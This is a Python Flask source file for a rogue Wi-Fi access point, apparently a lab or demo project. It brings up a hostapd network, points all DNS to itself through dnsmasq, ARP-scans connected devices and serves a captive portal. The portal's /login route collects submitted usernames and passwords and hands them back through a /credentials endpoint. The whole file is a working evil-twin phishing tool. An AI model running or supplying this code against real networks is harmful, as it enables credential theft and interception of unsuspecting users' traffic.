from flask import Flask, request, render_template, jsonify
import subprocess
import scapy.all as scapy
import threading
import time

app = Flask(__name__)

# Global variables
devices = []
credentials = []
interface = "wlan0" 
internet_interface = "wlan1"  
subnet = "192.168.1.0/24"  
ap_running = False


def run_command(command, error_message="Command failed"):
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    if process.returncode != 0:
        raise Exception(f"{error_message}: {process.stderr}")
    return process.stdout


def configure_network():
    try:
        # Disable NetworkManager for wlan0 and wlan1 to avoid interference
        run_command(f"sudo nmcli device set {interface} managed no", "Failed to set wlan0 unmanaged")
        run_command(f"sudo nmcli device set {internet_interface} managed no", "Failed to set wlan1 unmanaged")

        # Bring down the wlan0 interface and configure it for AP
        run_command(f"sudo ifconfig {interface} down", "Failed to bring wlan0 down")
        run_command(f"sudo ifconfig {interface} up", "Failed to bring wlan0 up")
        run_command(f"sudo ifconfig {interface} 192.168.1.1 netmask 255.255.255.0", "Failed to set IP for wlan0")

        # Configure DNS and DHCP (dnsmasq) for AP
        with open("dnsmasq.conf", "w") as f:
            f.write(f"""interface={interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1    
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-dhcp
log-queries
address=/#/192.168.1.1
""")
        subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)


        run_command("sudo sysctl -w net.ipv4.ip_forward=1", "Failed to enable IP forwarding")

        run_command(f"sudo iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE", "Failed to set NAT")
        run_command(f"sudo iptables -A FORWARD -i {interface} -j ACCEPT", "Failed to set forwarding")

        print("Network configured, DHCP started, and traffic redirected")
    except Exception as e:
        print(f"Network configuration failed: {e}")
        raise


def start_rogue_ap(ssid, password):
    global ap_running
    try:
        try:
            run_command("sudo pkill hostapd", "Failed to stop existing hostapd")
            time.sleep(1)
        except Exception:
            pass  
        with open("hostapd.conf", "w") as f:
            f.write(f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP""")
        
        hostapd_process = subprocess.Popen(["sudo", "hostapd", "hostapd.conf"], 
                                           stdout=subprocess.PIPE, 
                                           stderr=subprocess.PIPE)
        
        time.sleep(3)
        if hostapd_process.poll() is not None:
            _, stderr = hostapd_process.communicate()
            raise Exception(f"hostapd failed to start: {stderr.decode('utf-8')}")
            
        ap_running = True
        print(f"Rogue AP '{ssid}' started")
    except Exception as e:
        print(f"Error starting AP: {e}")

def arp_scan():
    global devices
    try:
        arp_request = scapy.ARP(pdst=subnet)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        devices = [{"ip": pkt[1].psrc, "mac": pkt[1].hwsrc} for pkt in answered_list]
    except Exception as e:
        print(f"ARP scan failed: {e}")

def start_scanning():
    while ap_running:
        arp_scan()
        time.sleep(2)

def cleanup():
    global ap_running
    ap_running = False
    errors = []

    try:
        run_command("sudo pkill hostapd", "Failed to stop hostapd")
    except Exception as e:
        errors.append(str(e))

    try:
        subprocess.run("sudo pkill -9 dnsmasq", shell=True, stderr=subprocess.PIPE)
    except Exception as e:
        errors.append(str(e))

    try:
        run_command(f"sudo ifconfig {interface} down", "Failed to bring interface down")
    except Exception as e:
        errors.append(str(e))

    try:
        run_command("sudo iptables -t nat -F", "Failed to flush NAT rules")
    except Exception as e:
        errors.append(str(e))

    return errors


def reset_settings():
    errors = []

    cleanup_errors = cleanup()
    errors.extend(cleanup_errors)

    try:
        run_command("sudo sysctl -w net.ipv4.ip_forward=0", "Failed to disable IP forwarding")
    except Exception as e:
        errors.append(str(e))

    try:
        run_command("sudo systemctl restart NetworkManager", "Failed to restart NetworkManager")
    except Exception as e:
        errors.append(str(e))

    try:
        run_command(f"sudo ifconfig {interface} up", "Failed to bring wlan0 interface up")
    except Exception as e:
        errors.append(str(e))

    if errors:
        print("Reset completed with errors: " + "; ".join(errors))
        return False, errors
    print("Settings reset to normal successfully")
    return True, []

@app.route("/start_ap", methods=["POST"])
def start_ap():
    global ap_running
    if ap_running:
        return jsonify({"error": "AP already running"}), 400
    
    # data = request.json
    ssid = "admin"
    password = "admin123"
    # ssid = data.get("ssid")
    # password = data.get("password")
    
    if not ssid or not password:
        return jsonify({"error": "SSID and password are required"}), 400
    
    try:
        configure_network()
        threading.Thread(target=start_rogue_ap, args=(ssid, password)).start()
        threading.Thread(target=start_scanning).start()
        return jsonify({"message": "Rogue AP started"})
    except Exception as e:
        cleanup()
        return jsonify({"error": str(e)}), 500

# API to stop AP
@app.route("/stop_ap", methods=["POST"])
def stop_ap():
    global ap_running
    if not ap_running:
        return jsonify({"error": "No AP running"}), 400
    
    cleanup()
    return jsonify({"message": "Rogue AP stopped"})

@app.route("/reset", methods=["POST"])
def reset():
    success, errors = reset_settings()
    if success:
        return jsonify({"message": "Settings reset to normal"})
    else:
        return jsonify({"error": "Failed to reset settings", "details": errors}), 500


@app.route("/devices", methods=["GET"])
def get_devices():
    return jsonify(devices)


@app.route("/", methods=["GET"])
def captive_portal():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    credentials.append({"username": username, "password": password})
    return "Login successful (demo)"

# API to get captured credentials
@app.route("/credentials", methods=["GET"])
def get_credentials():
    return jsonify(credentials)

# API to check AP status
@app.route("/status", methods=["GET"])
def get_status():
    return jsonify({"ap_running": ap_running})

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=80)
    except KeyboardInterrupt:
        cleanup()
